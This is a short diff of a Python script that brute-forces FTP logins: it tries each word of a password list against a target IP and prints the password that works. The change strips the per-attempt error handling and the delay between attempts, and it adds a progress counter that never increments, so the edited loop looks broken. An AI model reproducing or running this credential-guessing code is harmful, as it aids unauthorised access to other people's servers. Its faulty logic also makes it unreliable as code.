@@ -19,15 +19,15 @@ try:
     
     with open(PassList, 'r') as list:
         for word in list:
+
             word = word.strip('\r').strip('\n')
+            conn = ftplib.FTP(IP)
+            conn.login(user,word)
+            print(f'Correct password for user {user} is: {word}')
 
-            try:
-                conn = ftplib.FTP(IP)
-                conn.login(user,word)
-                print(f'Correct password for user {user} is: {word}')
-
-            except:
-                time.sleep(5)
+            # Printing that attack is in progress every 10 attempts.
+            count = 0
+            if count%10 == 0:
                 print(f'Attacking...')
 
 except:
